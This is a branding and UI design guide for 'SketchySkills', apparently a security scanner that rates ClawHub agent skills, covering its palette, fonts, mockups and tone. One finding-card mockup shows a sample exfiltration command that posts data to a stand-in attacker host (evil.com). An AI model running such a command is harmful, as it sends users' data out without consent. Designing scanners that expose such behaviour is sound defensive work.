# SketchySkills Branding Guide

## Name & Tagline

**Name:** SketchySkills  
**Tagline:** "Trust, but verify. We verify."  
**Subtitle:** "Automated security scanning for ClawHub skills"

## Logo Concept

**Icon:** 🕵️ (detective) or 🔍 (magnifying glass over code)  
**Colors:** See below

## Color Palette

### Primary Colors
- **Background (Dark):** `#0a0e1a` - Deep navy, professional
- **Card Background:** `#1a1f2e` - Slightly lighter
- **Text Primary:** `#e5e7eb` - Light gray (readable)
- **Text Secondary:** `#9ca3af` - Muted gray

### Severity Colors
- **Critical:** `#dc2626` (red-600) - Bright, urgent
- **High:** `#f97316` (orange-500) - Warning
- **Medium:** `#eab308` (yellow-500) - Caution
- **Low:** `#60a5fa` (blue-400) - Info
- **Clean:** `#22c55e` (green-500) - Safe

### Accent Colors
- **Primary Accent:** `#06b6d4` (cyan-500) - Links, buttons
- **Secondary Accent:** `#8b5cf6` (violet-500) - Highlights

## Typography

**Headings:** `Geist Sans` (or `Inter`) - Clean, modern  
**Body:** `Geist Sans` (or `Inter`) - Readable  
**Code/Mono:** `JetBrains Mono` (or `Fira Code`) - Technical

**Sizes:**
- Hero: `3xl` (30px)
- H1: `2xl` (24px)
- H2: `xl` (20px)
- H3: `lg` (18px)
- Body: `base` (16px)
- Small: `sm` (14px)

## Design Principles

1. **Professional but Accessible** - Security scanner, not hacker aesthetic
2. **Data-Dense** - Show lots of info without overwhelming
3. **Clear Hierarchy** - Critical findings stand out immediately
4. **Trustworthy** - Transparent methodology, clear evidence
5. **Fast** - Static site, instant loading

## UI Components

### Severity Badge
```
┌─────────────┐
│ 🔴 CRITICAL │  Red background, white text
└─────────────┘

┌─────────────┐
│ 🟠 HIGH     │  Orange background, dark text
└─────────────┘

┌─────────────┐
│ 🟡 MEDIUM   │  Yellow background, dark text
└─────────────┘

┌─────────────┐
│ 🔵 LOW      │  Blue background, white text
└─────────────┘

┌─────────────┐
│ 🟢 CLEAN    │  Green background, dark text
└─────────────┘
```

### Score Gauge
```
 SKETCHY SCORE
┌─────────────────────┐
│ ████████░░░░░░░░░░░ │
│        82/100       │
│      🟠 HIGH        │
└─────────────────────┘
```

### Finding Card
```
┌────────────────────────────────────────────┐
│ 🔴 Data Exfiltration (Critical)            │
│                                            │
│ Sends HTTP POST request to external       │
│ endpoint without user consent...           │
│                                            │
│ Evidence:                                  │
│ ┌────────────────────────────────────────┐│
│ │ curl -X POST https://evil.com/log     ││
│ └────────────────────────────────────────┘│
│                                            │
│ Weight: +50 points                         │
└────────────────────────────────────────────┘
```

## Page Layout

### Home Page
```
┌─────────────────────────────────────────────────┐
│  🕵️ SketchySkills                    [Search]  │
│  Trust, but verify. We verify.                  │
├─────────────────────────────────────────────────┤
│  ┌────────┐ ┌────────┐ ┌────────┐ ┌────────┐  │
│  │ 10     │ │ 1      │ │ 5      │ │ $0.29  │  │
│  │ Skills │ │ High   │ │ Clean  │ │ Cost   │  │
│  └────────┘ └────────┘ └────────┘ └────────┘  │
│                                                 │
│  🔥 Most Sketchy Skills                         │
│  ┌─────────────────────────────────────────┐  │
│  │ 1. 🟠 wed-1-0-1          Score: 82/100  │  │
│  │ 2. 🔵 aisp               Score: 38/100  │  │
│  │ ...                                      │  │
│  └─────────────────────────────────────────┘  │
│                                                 │
│  📊 All Skills (sortable table)                │
│  [ Name ▼ | Score | Severity | Findings | → ] │
├─────────────────────────────────────────────────┤
│  Methodology | About | GitHub                  │
└─────────────────────────────────────────────────┘
```

### Skill Detail Page
```
┌─────────────────────────────────────────────────┐
│  ← Back to All Skills                           │
│                                                  │
│  wed-1-0-1                                       │
│  ┌─────────────────────┐                        │
│  │  SKETCHY SCORE      │                        │
│  │  ████████░░░  82    │                        │
│  │     🟠 HIGH         │                        │
│  └─────────────────────┘                        │
│                                                  │
│  📝 Summary                                      │
│  This skill masquerades as a business...        │
│                                                  │
│  🔍 Findings (5)                                │
│  [Data Exfiltration card]                       │
│  [Credential Access card]                       │
│  [Prompt Injection card]                        │
│  ...                                             │
│                                                  │
│  📄 Files Analyzed                               │
│  • SKILL.md (2.4 KB)                            │
│  • rules/logic.md (8.1 KB)                      │
│                                                  │
│  🔗 Links                                        │
│  [View on ClawHub] [View Source]                │
└─────────────────────────────────────────────────┘
```

## Voice & Tone

- **Confident, not cocky** - "We found malware" not "We're amazing"
- **Direct, not alarmist** - State facts clearly
- **Helpful, not preachy** - Explain risks, don't lecture
- **Transparent** - Show all evidence, explain methodology

**Good Examples:**
- "82/100 Sketchy Score - High Severity"
- "Harvests system information and sends to external endpoint"
- "Recommendation: BLOCK - Evidence suggests data exfiltration"

**Bad Examples:**
- "DANGER! MALWARE DETECTED!!!" (too alarmist)
- "This skill is probably fine" (too soft)
- "Trust me, it's bad" (not transparent)

---

**Brand Personality:** Professional security researcher who explains findings clearly and backs up claims with evidence.
